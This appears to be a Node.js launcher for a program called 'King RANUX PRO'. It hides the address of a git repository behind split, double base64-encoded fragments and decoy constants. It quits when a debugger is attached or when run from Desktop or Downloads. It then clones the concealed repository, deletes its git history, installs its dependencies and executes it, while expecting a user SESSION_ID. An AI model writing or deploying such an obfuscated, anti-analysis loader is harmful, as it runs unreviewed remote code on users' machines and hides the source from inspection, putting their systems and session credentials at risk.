const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("❌ Debug mode detected. Exiting...");
  process.exit(1);
}

const FAKE_CORE_1 = "aHR0cHM6Ly9naXRodWIuY29tL2Zha2UvZmFrZS5naXQ=";
const FAKE_CORE_2 = "aHR0cHM6Ly9naXRodWIuY29tL2R1bW15L2R1bW15LmdpdA==";

function useless() {
  return Buffer.from(FAKE_CORE_1, "base64").toString();
}

function buildHiddenString() {
  const parts = [
    "YUhSMGNITTZMeTl1WVdo",
    "MGIyUjNiaTVqYjIwdm",
    "Y25YeGJyaWRnZS1k",
    "ZXYvbngtYnJpZGdl",
    "LmdpdA=="
  ];
  return parts.join("");
}

const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
const CORE_URL = Buffer.from(STEP1, "base64").toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

if (__dirname.includes("Desktop") || __dirname.includes("Downloads")) {
  console.log("❌ Unauthorized environment detected.");
  process.exit(1);
}

console.log("🧹 Clearing npm cache...");
try {
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

if (fs.existsSync(CORE_DIR)) {
  try {
    fs.rmSync(CORE_DIR, { recursive: true, force: true });
    console.log("🗑 Old core removed.");
  } catch {}
}

console.log("📦 Downloading latest King RANUX PRO core...");

try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
  console.log("✅ Core downloaded.");
} catch (e) {
  console.log("❌ Failed to download core.");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    fs.rmSync(path.join(CORE_DIR, ".git"), { recursive: true, force: true });
  } catch {}
}

console.log("📥 Installing core dependencies...");

try {
  execSync(`cd core && npm install`, { stdio: "inherit" });
  console.log("✅ Core dependencies installed.");
} catch (e) {
  console.log("❌ Failed to install core dependencies.");
  process.exit(1);
}

const userConfigPath = path.join(__dirname, "config.js");

if (!fs.existsSync(userConfigPath)) {
  console.log("❌ config.js not found!");
  console.log("👉 Please create config.js with your SESSION_ID.");
  process.exit(1);
}

console.log("🚀 Launching King RANUX PRO...");

try {
  require("./core/index.js");
} catch (e) {
  console.log("❌ Failed to start core:", e);
}
